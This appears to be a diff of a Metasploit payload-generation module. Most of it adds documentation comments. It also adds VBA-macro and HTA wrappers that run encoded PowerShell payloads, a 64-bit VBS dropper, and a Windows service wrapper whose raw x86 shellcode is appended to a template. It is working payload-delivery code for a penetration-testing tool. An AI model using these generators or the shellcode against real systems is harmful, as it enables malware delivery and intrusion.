@@ -21,14 +21,16 @@ require 'digest/sha1'
 require 'msf/core/exe/segment_injector'
 require 'msf/core/exe/segment_appender'
 
-  ##
+  # Generates a default template
   #
-  # Helper functions common to multiple generators
-  #
-  ##
-
+  # @param  opts [Hash] The options hash
+  # @option opts [String] :template, the template type for the executable
+  # @option opts [String] :template_path, the path for the template
+  # @option opts [Bool] :fallback, If there are no options set, default options will be used
+  # @param  exe  [String] Template type. If undefined, will use the default.
+  # @param  path [String] Where you would like the template to be saved.
   def self.set_template_default(opts, exe = nil, path = nil)
-    # If no path specified, use the default one.
+    # If no path specified, use the default one
     path ||= File.join(Msf::Config.data_directory, "templates")
 
     # If there's no default name, we must blow it up.
@@ -60,6 +62,10 @@ require 'msf/core/exe/segment_appender'
     end
   end
 
+  # self.read_replace_script_template
+  #
+  # @param filename [String] Name of the file
+  # @param hash_sub [Hash]
   def self.read_replace_script_template(filename, hash_sub)
     template_pathname = File.join(Msf::Config.data_directory, "templates",
                                   "scripts", filename)
@@ -68,12 +74,15 @@ require 'msf/core/exe/segment_appender'
     template % hash_sub
   end
 
-  ##
-  #
   # Executable generators
   #
-  ##
-
+  # @param arch       [Array<String>] The architecture of the system (i.e :x86, :x64)
+  # @param plat       [String] The platform (i.e Linux, Windows, OSX)
+  # @param code       [String]
+  # @param opts       [Hash]   The options hash
+  # @param framework  [Msf::Framework]  The framework of you want to use
+  # @return           [String]
+  # @return           [NilClass]
   def self.to_executable(framework, arch, plat, code = '', opts = {})
     if arch.index(ARCH_X86)
 
@@ -154,9 +163,10 @@ require 'msf/core/exe/segment_appender'
   end
 
   # Clears the DYNAMIC_BASE flag for a Windows executable
-  # @param exe [String] The raw executable to be modified by the method
-  # @param pe [Rex::PeParsey::Pe] Use Rex::PeParsey::Pe.new_from_file
-  # @return [String] the modified executable
+  #
+  # @param  exe  [String] The raw executable to be modified by the method
+  # @param  pe   [Rex::PeParsey::Pe] Use Rex::PeParsey::Pe.new_from_file
+  # @return      [String] the modified executable
   def self.clear_dynamic_base(exe, pe)
     c_bits = ("%32d" %pe.hdr.opt.DllCharacteristics.to_s(2)).split('').map { |e| e.to_i }.reverse
     c_bits[6] = 0 # DYNAMIC_BASE
@@ -169,6 +179,16 @@ require 'msf/core/exe/segment_appender'
     exe
   end
 
+  # self.to_win32pe
+  #
+  # @param  framework [Msf::Framework]
+  # @param  code      [String]
+  # @param  opts      [Hash]
+  # @option opts      [String] :sub_method
+  # @option opts      [String] :inject, Code to inject into the exe
+  # @option opts      [String] :template
+  # @option opts      [Symbol] :arch, Set to :x86 by default
+  # @return           [String]
   def self.to_win32pe(framework, code, opts = {})
 
     # For backward compatability, this is roughly equivalent to 'exe-small' fmt
@@ -313,6 +333,12 @@ require 'msf/core/exe/segment_appender'
     exe
   end
 
+  # self.to_winpe_only
+  #
+  # @param framework  [Msf::Framework]  The framework of you want to use
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @param arch       [String] Default is "x86"
   def self.to_winpe_only(framework, code, opts = {}, arch="x86")
     arch = ARCH_X64 if arch == ARCH_X86_64
 
@@ -378,6 +404,11 @@ require 'msf/core/exe/segment_appender'
     exe
   end
 
+  # self.to_win32pe_old
+  #
+  # @param framework  [Msf::Framework]  The framework of you want to use
+  # @param  code      [String]
+  # @param  opts      [Hash]
   def self.to_win32pe_old(framework, code, opts = {})
 
     payload = code.dup
@@ -431,9 +462,8 @@ require 'msf/core/exe/segment_appender'
 
   # Splits a string into a number of assembly push operations
   #
-  # @param string [String] string to be used
-  #
-  # @return [String] null terminated string as assembly push ops
+  # @param string [String] String to be used
+  # @return       [String] null terminated string as assembly push ops
   def self.string_to_pushes(string)
     str = string.dup
     # Align string to 4 bytes
@@ -455,6 +485,14 @@ require 'msf/core/exe/segment_appender'
     pushes
   end
 
+  # self.exe_sub_method
+  #
+  # @param  code [String]
+  # @param  opts [Hash]
+  # @option opts [Symbol] :exe_type
+  # @option opts [String] :service_exe
+  # @option opts [Boolean] :sub_method
+  # @return      [String]
   def self.exe_sub_method(code,opts ={})
     pe = self.get_file_contents(opts[:template])
 
@@ -504,6 +542,12 @@ require 'msf/core/exe/segment_appender'
     pe
   end
 
+  # self.to_win32pe_exe_sub
+  #
+  # @param framework  [Msf::Framework]  The framework of you want to use
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @return           [String]
   def self.to_win32pe_exe_sub(framework, code, opts = {})
     # Allow the user to specify their own DLL template
     set_template_default(opts, "template_x86_windows.exe")
@@ -511,6 +555,12 @@ require 'msf/core/exe/segment_appender'
     exe_sub_method(code,opts)
   end
 
+  # self.to_win64pe
+  #
+  # @param framework  [Msf::Framework]  The framework of you want to use
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @return           [String]
   def self.to_win64pe(framework, code, opts = {})
     # Allow the user to specify their own EXE template
     set_template_default(opts, "template_x64_windows.exe")
@@ -525,9 +575,6 @@ require 'msf/core/exe/segment_appender'
       return injector.generate_pe
     end
 
-    #opts[:exe_type] = :exe_sub
-    #return exe_sub_method(code,opts)
-
     # Append a new section instead
     appender = Msf::Exe::SegmentAppender.new({
       :payload  => code,
@@ -540,18 +587,18 @@ require 'msf/core/exe/segment_appender'
   # Embeds shellcode within a Windows PE file implementing the Windows
   # service control methods.
   #
-  # @param framework [Object]
-  # @param code [String] shellcode to be embedded
-  # @option opts [Boolean] :sub_method use substitution technique with a
-  #   service template PE
-  # @option opts [String] :servicename name of the service, not used in
-  #   substituion technique
+  # @param  framework   [Object]
+  # @param  code        [String] shellcode to be embedded
+  # @option opts        [Boolean] :sub_method use substitution technique with a
+  #                                service template PE
+  # @option opts        [String] :servicename name of the service, not used in
+  #                               substituion technique
   #
   # @return [String] Windows Service PE file
   def self.to_win32pe_service(framework, code, opts = {})
+    set_template_default(opts, "template_x86_windows_svc.exe")
     if opts[:sub_method]
       # Allow the user to specify their own service EXE template
-      set_template_default(opts, "template_x86_windows_svc.exe")
       opts[:exe_type] = :service_exe
       return exe_sub_method(code,opts)
     else
@@ -591,29 +638,44 @@ require 'msf/core/exe/segment_appender'
         "\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
         "\x6A\x00\x68\x70\x69\x33\x32\x68\x61\x64\x76\x61\x54\x68\x4C\x77" +
         "\x26\x07\xFF\xD5#{pushed_service_name}\x89\xE1" +
-        "\x8D\x85#{[svcmain_code_offset].pack('<I')}\x6A\x00\x50\x51\x89\xE0\x6A\x00\x50\x68" +
+        "\x8D\x85#{[svcmain_code_offset].pack('I<')}\x6A\x00\x50\x51\x89\xE0\x6A\x00\x50\x68" +
         "\xFA\xF7\x72\xCB\xFF\xD5\x6A\x00\x68\xF0\xB5\xA2\x56\xFF\xD5\x58" +
         "\x58\x58\x58\x31\xC0\xC3\xFC\xE8\x00\x00\x00\x00\x5D\x81\xED" +
-        "#{[hash_code_offset].pack('<I') + pushed_service_name}\x89\xE1\x8D" +
-        "\x85#{[svcctrlhandler_code_offset].pack('<I')}\x6A\x00\x50\x51\x68\x0B\xAA\x44\x52\xFF\xD5" +
+        "#{[hash_code_offset].pack('I<') + pushed_service_name}\x89\xE1\x8D" +
+        "\x85#{[svcctrlhandler_code_offset].pack('I<')}\x6A\x00\x50\x51\x68\x0B\xAA\x44\x52\xFF\xD5" +
         "\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x04\x6A\x10" +
         "\x89\xE1\x6A\x00\x51\x50\x68\xC6\x55\x37\x7D\xFF\xD5\x31\xFF\x6A" +
         "\x04\x68\x00\x10\x00\x00\x6A\x54\x57\x68\x58\xA4\x53\xE5\xFF\xD5" +
         "\xC7\x00\x44\x00\x00\x00\x8D\x70\x44\x57\x68\x2E\x65\x78\x65\x68" +
         "\x6C\x6C\x33\x32\x68\x72\x75\x6E\x64\x89\xE1\x56\x50\x57\x57\x6A" +
         "\x44\x57\x57\x57\x51\x57\x68\x79\xCC\x3F\x86\xFF\xD5\x8B\x0E\x6A" +
-        "\x40\x68\x00\x10\x00\x00\x68#{[code.length].pack('<I')}\x57\x51\x68\xAE\x87" +
+        "\x40\x68\x00\x10\x00\x00\x68#{[code.length].pack('I<')}\x57\x51\x68\xAE\x87" +
         "\x92\x3F\xFF\xD5\xE8\x00\x00\x00\x00\x5A\x89\xC7\x8B\x0E\x81\xC2" +
-        "#{[shellcode_code_offset].pack('<I')}\x54\x68#{[code.length].pack('<I')}" +
+        "#{[shellcode_code_offset].pack('I<')}\x54\x68#{[code.length].pack('I<')}" +
         "\x52\x50\x51\x68\xC5\xD8\xBD\xE7\xFF" +
         "\xD5\x31\xC0\x8B\x0E\x50\x50\x50\x57\x50\x50\x51\x68\xC6\xAC\x9A" +
         "\x79\xFF\xD5\x8B\x0E\x51\x68\xC6\x96\x87\x52\xFF\xD5\x8B\x4E\x04" +
         "\x51\x68\xC6\x96\x87\x52\xFF\xD5#{code_service_stopped}"
 
-      to_winpe_only(framework, code_service + code, opts)
+      # Append a new section to the template
+      Msf::Exe::SegmentAppender.new({
+        :payload  => code_service + code,
+        :template => opts[:template],
+        :arch     => :x86
+      }).generate_pe
     end
   end
 
+  # self.to_win64pe_service
+  #
+  # @param framework  [Msf::Framework]  The framework of you want to use
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :exe_type
+  # @option           [String] :service_exe
+  # @option           [String] :dll
+  # @option           [String] :inject
+  # @return           [String]
   def self.to_win64pe_service(framework, code, opts = {})
     # Allow the user to specify their own service EXE template
     set_template_default(opts, "template_x64_windows_svc.exe")
@@ -621,6 +683,15 @@ require 'msf/core/exe/segment_appender'
     exe_sub_method(code,opts)
   end
 
+  # self.to_win32pe_dll
+  #
+  # @param framework  [Msf::Framework]  The framework of you want to use
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :exe_type
+  # @option           [String] :dll
+  # @option           [String] :inject
+  # @return           [String]
   def self.to_win32pe_dll(framework, code, opts = {})
     # Allow the user to specify their own DLL template
     set_template_default(opts, "template_x86_windows.dll")
@@ -633,6 +704,15 @@ require 'msf/core/exe/segment_appender'
     end
   end
 
+  # self.to_win64pe_dll
+  #
+  # @param framework  [Msf::Framework]  The framework of you want to use
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :exe_type
+  # @option           [String] :dll
+  # @option           [String] :inject
+  # @return           [String]
   def self.to_win64pe_dll(framework, code, opts = {})
     # Allow the user to specify their own DLL template
     set_template_default(opts, "template_x64_windows.dll")
@@ -645,10 +725,14 @@ require 'msf/core/exe/segment_appender'
     end
   end
 
+  # Wraps an executable inside a Windows .msi file for auto execution when run
   #
-  #   Wraps an executable inside a Windows
-  #    .msi file for auto execution when run
-  #
+  # @param framework  [Msf::Framework]  The framework of you want to use
+  # @param exe        [String]
+  # @param opts       [Hash]
+  # @option opts      [String] :msi_template_path
+  # @option opts      [String] :msi_template
+  # @return [String]
   def self.to_exe_msi(framework, exe, opts = {})
     if opts[:uac]
       opts[:msi_template] ||= "template_windows.msi"
@@ -658,6 +742,13 @@ require 'msf/core/exe/segment_appender'
     replace_msi_buffer(exe, opts)
   end
 
+  #self.replace_msi_buffer
+  #
+  # @param pe     [String]
+  # @param opts   [String]
+  # @option       [String] :msi_template
+  # @option       [String] :msi_template_path
+  # @return       [String]
   def self.replace_msi_buffer(pe, opts)
     opts[:msi_template_path] ||= File.join(Msf::Config.data_directory, "templates")
 
@@ -669,7 +760,7 @@ require 'msf/core/exe/segment_appender'
 
     msi = self.get_file_contents(template)
 
-    section_size =	2**(msi[30..31].unpack('v')[0])
+    section_size = 2**(msi[30..31].unpack('v')[0])
 
     # This table is one of the few cases where signed values are needed
     sector_allocation_table = msi[section_size..section_size*2].unpack('l<*')
@@ -706,6 +797,13 @@ require 'msf/core/exe/segment_appender'
     msi
   end
 
+  # self.to_osx_arm_macho
+  #
+  # @param framework  [Msf::Framework]  The framework of you want to use
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String]
   def self.to_osx_arm_macho(framework, code, opts = {})
 
     # Allow the user to specify their own template
@@ -717,6 +815,13 @@ require 'msf/core/exe/segment_appender'
     mo
   end
 
+  # self.to_osx_ppc_macho
+  #
+  # @param framework  [Msf::Framework]  The framework of you want to use
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String]
   def self.to_osx_ppc_macho(framework, code, opts = {})
 
     # Allow the user to specify their own template
@@ -728,6 +833,13 @@ require 'msf/core/exe/segment_appender'
     mo
   end
 
+  # self.to_osx_x86_macho
+  #
+  # @param framework  [Msf::Framework]  The framework of you want to use
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String]
   def self.to_osx_x86_macho(framework, code, opts = {})
 
     # Allow the user to specify their own template
@@ -739,6 +851,13 @@ require 'msf/core/exe/segment_appender'
     mo
   end
 
+  # self.to_osx_x64_macho
+  #
+  # @param framework  [Msf::Framework]  The framework of you want to use
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String]
   def self.to_osx_x64_macho(framework, code, opts = {})
     set_template_default(opts, "template_x64_darwin.bin")
 
@@ -749,12 +868,13 @@ require 'msf/core/exe/segment_appender'
     macho
   end
 
-  # @param [Hash] opts the options hash
-  # @option opts [String] :exe_name (random) the name of the macho exe file (never seen by the user)
-  # @option opts [String] :app_name (random) the name of the OSX app
-  # @option opts [String] :hidden (true) hide the app when it is running
-  # @option opts [String] :plist_extra ('') some extra data to shove inside the Info.plist file
-  # @return [String] zip archive containing an OSX .app directory
+  # self.to_osx_app
+  # @param  opts [Hash] The options hash
+  # @option opts [Hash] :exe_name (random) the name of the macho exe file (never seen by the user)
+  # @option opts [Hash] :app_name (random) the name of the OSX app
+  # @option opts [Hash] :hidden (true) hide the app when it is running
+  # @option opts [Hash] :plist_extra ('') some extra data to shove inside the Info.plist file
+  # @return      [String] zip archive containing an OSX .app directory
   def self.to_osx_app(exe, opts = {})
     exe_name    = opts.fetch(:exe_name) { Rex::Text.rand_text_alpha(8) }
     app_name    = opts.fetch(:app_name) { Rex::Text.rand_text_alpha(8) }
@@ -809,7 +929,13 @@ require 'msf/core/exe/segment_appender'
   # For user-provided templates, modifies the header to mark all executable
   # segments as writable and overwrites the entrypoint (usually _start) with
   # the payload.
-  #
+  # @param framework  [Msf::Framework]  The framework of you want to use
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @param template   [String]
+  # @param code       [String]
+  # @param big_endian [Boolean]  Set to "false" by default
+  # @return           [String]
   def self.to_exe_elf(framework, opts, template, code, big_endian=false)
 
     # Allow the user to specify their own template
@@ -854,12 +980,23 @@ require 'msf/core/exe/segment_appender'
   end
 
   # Create a 32-bit Linux ELF containing the payload provided in +code+
+  #
+  # @param framework  [Msf::Framework]  The framework of you want to use
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String] Returns an elf
   def self.to_linux_x86_elf(framework, code, opts = {})
     default = true unless opts[:template]
 
     if default
       elf = to_exe_elf(framework, opts, "template_x86_linux.bin", code)
     else
+      # Use set_template_default to normalize the :template key. It will just end up doing
+      # opts[:template] = File.join(opts[:template_path], opts[:template])
+      # for us, check if the file exists.
+      set_template_default(opts, 'template_x86_linux.bin')
+
       # If this isn't our normal template, we have to do some fancy
       # header patching to mark the .text section rwx before putting our
       # payload into the entry point.
@@ -892,42 +1029,96 @@ require 'msf/core/exe/segment_appender'
   end
 
   # Create a 32-bit BSD (test on FreeBSD) ELF containing the payload provided in +code+
+  #
+  # @param framework [Msf::Framework]
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String] Returns an elf
   def self.to_bsd_x86_elf(framework, code, opts = {})
     to_exe_elf(framework, opts, "template_x86_bsd.bin", code)
   end
 
   # Create a 64-bit Linux ELF containing the payload provided in +code+
+  #
+  # @param framework [Msf::Framework]
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String] Returns an elf
   def self.to_bsd_x64_elf(framework, code, opts = {})
     to_exe_elf(framework, opts, "template_x64_bsd.bin", code)
   end
 
   # Create a 32-bit Solaris ELF containing the payload provided in +code+
+  #
+  # @param framework [Msf::Framework]
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String] Returns an elf
   def self.to_solaris_x86_elf(framework, code, opts = {})
     to_exe_elf(framework, opts, "template_x86_solaris.bin", code)
   end
 
   # Create a 64-bit Linux ELF containing the payload provided in +code+
+  #
+  # @param framework [Msf::Framework]
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String] Returns an elf
   def self.to_linux_x64_elf(framework, code, opts = {})
     to_exe_elf(framework, opts, "template_x64_linux.bin", code)
   end
 
   # Create a 64-bit Linux ELF_DYN containing the payload provided in +code+
+  #
+  # @param framework [Msf::Framework]
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String] Returns an elf
   def self.to_linux_x64_elf_dll(framework, code, opts = {})
     to_exe_elf(framework, opts, "template_x64_linux_dll.bin", code)
   end
 
+  # self.to_linux_mipsle_elf
+  #
+  # @param framework [Msf::Framework]
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String] Returns an elf
   def self.to_linux_armle_elf(framework, code, opts = {})
     to_exe_elf(framework, opts, "template_armle_linux.bin", code)
   end
 
+  # self.to_linux_mipsle_elf
+  # Little Endian
+  # @param framework [Msf::Framework]
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String] Returns an elf
   def self.to_linux_mipsle_elf(framework, code, opts = {})
     to_exe_elf(framework, opts, "template_mipsle_linux.bin", code)
   end
 
+  # self.to_linux_mipsbe_elf
+  # Big Endian
+  # @param framework [Msf::Framework]
+  # @param code       [String]
+  # @param opts       [Hash]
+  # @option           [String] :template
+  # @return           [String] Returns an elf
   def self.to_linux_mipsbe_elf(framework, code, opts = {})
     to_exe_elf(framework, opts, "template_mipsbe_linux.bin", code, true)
   end
 
+  # self.to_exe_vba
+  #
+  # @param exes [String]
   def self.to_exe_vba(exes='')
     exe = exes.unpack('C*')
     hash_sub = {}
@@ -974,26 +1165,31 @@ require 'msf/core/exe/segment_appender'
     read_replace_script_template("to_exe.vba.template", hash_sub)
   end
 
+  # self.to_vba
+  #
+  # @param framework  [Msf::Framework]
+  # @param code       [String]
+  # @param opts       [Hash]    Unused
   def self.to_vba(framework,code,opts = {})
     hash_sub = {}
-    hash_sub[:var_myByte]		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_myArray]		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_rwxpage]  	  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_res]      	  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_offset] 		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    hash_sub[:var_myByte]             = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    hash_sub[:var_myArray]            = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    hash_sub[:var_rwxpage]            = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    hash_sub[:var_res]                = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    hash_sub[:var_offset]             = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
     hash_sub[:var_lpThreadAttributes] = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
     hash_sub[:var_dwStackSize]        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
     hash_sub[:var_lpStartAddress]     = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
     hash_sub[:var_lpParameter]        = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_dwCreationFlags]	  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    hash_sub[:var_dwCreationFlags]    = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
     hash_sub[:var_lpThreadID]         = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
     hash_sub[:var_lpAddr]             = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
     hash_sub[:var_lSize]              = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
     hash_sub[:var_flAllocationType]   = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
     hash_sub[:var_flProtect]          = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_lDest]	          = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_Source]	 	  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
-    hash_sub[:var_Length]		  = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    hash_sub[:var_lDest]              = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    hash_sub[:var_Source]             = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
+    hash_sub[:var_Length]             = Rex::Text.rand_text_alpha(rand(7)+3).capitalize
 
     # put the shellcode bytes into an array
     hash_sub[:bytes] = Rex::Text.to_vbapplication(code, hash_sub[:var_myArray])
@@ -1001,21 +1197,61 @@ require 'msf/core/exe/segment_appender'
     read_replace_script_template("to_mem.vba.template", hash_sub)
   end
 
+  # self.to_powershell_vba
+  #
+  # @param framework  [Msf::Framework]
+  # @param arch       [String]
+  # @param code       [String]
+  #
+  def self.to_powershell_vba(framework, arch, code)
+    template_path = File.join(Msf::Config.data_directory,
+                              "templates",
+                              "scripts")
+
+    powershell = Rex::Powershell::Command.cmd_psh_payload(code,
+                    arch,
+                    template_path,
+                    encode_final_payload: true,
+                    remove_comspec: true,
+                    method: 'reflection')
+
+    # Intialize rig and value names
+    rig = Rex::RandomIdentifierGenerator.new()
+    rig.init_var(:sub_auto_open)
+    rig.init_var(:var_powershell)
+
+    hash_sub = rig.to_h
+    # VBA has a maximum of 24 line continuations
+    line_length = powershell.length / 24
+    vba_psh = '"' << powershell.scan(/.{1,#{line_length}}/).join("\" _\r\n& \"") << '"'
+
+    hash_sub[:powershell] = vba_psh
+
+    read_replace_script_template("to_powershell.vba.template", hash_sub)
+  end
+
+  # self.to_exe_vba
+  #
+  # @param  exes  [String]
+  # @param  opts  [Hash]
+  # @option opts  [String] :delay
+  # @option opts  [String] :persists
+  # @option opts  [String] :exe_filename
   def self.to_exe_vbs(exes = '', opts = {})
     delay   = opts[:delay]   || 5
     persist = opts[:persist] || false
 
     hash_sub = {}
+    hash_sub[:exe_filename]  = opts[:exe_filename] || Rex::Text.rand_text_alpha(rand(8)+8) << '.exe'
     hash_sub[:var_shellcode] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:exe_filename] = Rex::Text.rand_text_alpha(rand(8)+8) << '.exe'
-    hash_sub[:var_fname]   = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_func]    = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_stream]  = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_obj]     = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_shell]   = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_tempdir] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_tempexe] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_basedir] = Rex::Text.rand_text_alpha(rand(8)+8)
+    hash_sub[:var_fname]     = Rex::Text.rand_text_alpha(rand(8)+8)
+    hash_sub[:var_func]      = Rex::Text.rand_text_alpha(rand(8)+8)
+    hash_sub[:var_stream]    = Rex::Text.rand_text_alpha(rand(8)+8)
+    hash_sub[:var_obj]       = Rex::Text.rand_text_alpha(rand(8)+8)
+    hash_sub[:var_shell]     = Rex::Text.rand_text_alpha(rand(8)+8)
+    hash_sub[:var_tempdir]   = Rex::Text.rand_text_alpha(rand(8)+8)
+    hash_sub[:var_tempexe]   = Rex::Text.rand_text_alpha(rand(8)+8)
+    hash_sub[:var_basedir]   = Rex::Text.rand_text_alpha(rand(8)+8)
 
     hash_sub[:hex_shellcode] = exes.unpack('H*').join('')
 
@@ -1033,6 +1269,10 @@ require 'msf/core/exe/segment_appender'
     read_replace_script_template("to_exe.vbs.template", hash_sub)
   end
 
+  # self.to_exe_asp
+  #
+  # @param exes [String]
+  # @param opts [Hash]    Unused
   def self.to_exe_asp(exes = '', opts = {})
     hash_sub = {}
     hash_sub[:var_bytes]   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
@@ -1044,24 +1284,24 @@ require 'msf/core/exe/segment_appender'
     hash_sub[:var_tempdir] = Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_tempexe] = Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_basedir] = Rex::Text.rand_text_alpha(rand(8)+8)
-
     hash_sub[:var_shellcode] = Rex::Text.to_vbscript(exes, hash_sub[:var_bytes])
-
     read_replace_script_template("to_exe.asp.template", hash_sub)
   end
 
+  # self.to_exe_aspx
+  #
+  # @param  exes [String]
+  # @option opts [Hash]
   def self.to_exe_aspx(exes = '', opts = {})
     hash_sub = {}
-    hash_sub[:var_file] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_tempdir] 	= Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_basedir]	= Rex::Text.rand_text_alpha(rand(8)+8)
+    hash_sub[:var_file]     = Rex::Text.rand_text_alpha(rand(8)+8)
+    hash_sub[:var_tempdir]  = Rex::Text.rand_text_alpha(rand(8)+8)
+    hash_sub[:var_basedir]  = Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_filename] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_tempexe] 	= Rex::Text.rand_text_alpha(rand(8)+8)
+    hash_sub[:var_tempexe]  = Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:var_iterator] = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_proc]	= Rex::Text.rand_text_alpha(rand(8)+8)
-
+    hash_sub[:var_proc] = Rex::Text.rand_text_alpha(rand(8)+8)
     hash_sub[:shellcode] = Rex::Text.to_csharp(exes,100,hash_sub[:var_file])
-
     read_replace_script_template("to_exe.aspx.template", hash_sub)
   end
 
@@ -1117,8 +1357,35 @@ require 'msf/core/exe/segment_appender'
                     method: 'reflection')
   end
 
+  def self.to_powershell_hta(framework, arch, code)
+    template_path = File.join(Msf::Config.data_directory,
+                              "templates",
+                              "scripts")
+
+    powershell = Rex::Powershell::Command.cmd_psh_payload(code,
+                    arch,
+                    template_path,
+                    encode_final_payload: true,
+                    remove_comspec: true,
+                    method: 'reflection')
+
+    # Intialize rig and value names
+    rig = Rex::RandomIdentifierGenerator.new()
+    rig.init_var(:var_shell)
+    rig.init_var(:var_fso)
+
+    hash_sub = rig.to_h
+    hash_sub[:powershell] = powershell
+
+    read_replace_script_template("to_powershell.hta.template", hash_sub)
+  end
+
   def self.to_win32pe_vbs(framework, code, opts = {})
     to_exe_vbs(to_win32pe(framework, code, opts), opts)
+  end
+
+  def self.to_win64pe_vbs(framework, code, opts = {})
+    to_exe_vbs(to_win64pe(framework, code, opts), opts)
   end
 
   # Creates a jar file that drops the provided +exe+ into a random file name
@@ -1135,7 +1402,7 @@ require 'msf/core/exe/segment_appender'
     paths = [
       [ "metasploit", "Payload.class" ],
     ]
-    zip.add_files(paths, File.join(Msf::Config.data_directory, "java"))
+    zip.add_files(paths, MetasploitPayloads.path('java'))
     zip.build_manifest :main_class => "metasploit.Payload"
     config = "Spawn=#{spawn}\r\nExecutable=#{exe_name}\r\n"
     zip.add_file("metasploit.dat", config)
@@ -1216,7 +1483,6 @@ require 'msf/core/exe/segment_appender'
   # @option opts (see to_war)
   # @return (see to_war)
   def self.to_jsp_war(exe, opts = {})
-
     # begin <payload>.jsp
     hash_sub = {}
     hash_sub[:var_hexpath]       = Rex::Text.rand_text_alpha(rand(8)+8)
@@ -1257,6 +1523,16 @@ require 'msf/core/exe/segment_appender'
   # at a specified location with read/execute permissions
   #    - the data will be loaded at: base+0x2065
   #    - default max size is 0x8000 (32768)
+  # @param  base [Integer] Default location set to base 0x12340000
+  # @param  data [String]
+  # @param  opts [Hash]
+  # @option      [String] :template
+  # @option      [String] :base_offset
+  # @option      [String] :timestamp_offset
+  # @option      [String] :text_offset
+  # @option      [String] :pack
+  # @option      [String] :uuid_offset
+  # @return      [String]
   def self.to_dotnetmem(base=0x12340000, data="", opts = {})
 
     # Allow the user to specify their own DLL template
@@ -1289,7 +1565,13 @@ require 'msf/core/exe/segment_appender'
     pe
   end
 
-
+  # self.encode_stub
+  #
+  # @param framework [Msf::Framework]
+  # @param arch     [String]
+  # @param code     [String]
+  # @param platform [String]
+  # @param badchars [String]
   def self.encode_stub(framework, arch, code, platform = nil, badchars = '')
     return code unless framework.encoders
     framework.encoders.each_module_ranked('Arch' => arch) do |name, mod|
@@ -1673,8 +1955,8 @@ require 'msf/core/exe/segment_appender'
 
     set_handler:
       xor eax,eax
-;		  push dword [fs:eax]
-;		  mov dword [fs:eax], esp
+;     push dword [fs:eax]
+;     mov dword [fs:eax], esp
       push eax               ; LPDWORD lpThreadId (NULL)
       push eax               ; DWORD dwCreationFlags (0)
       push eax               ; LPVOID lpParameter (NULL)
@@ -1685,10 +1967,10 @@ require 'msf/core/exe/segment_appender'
       call ebp               ; Spawn payload thread
 
       pop eax                ; Skip
-;		  pop eax                ; Skip
+;     pop eax                ; Skip
       pop eax                ; Skip
       popad                  ; Get our registers back
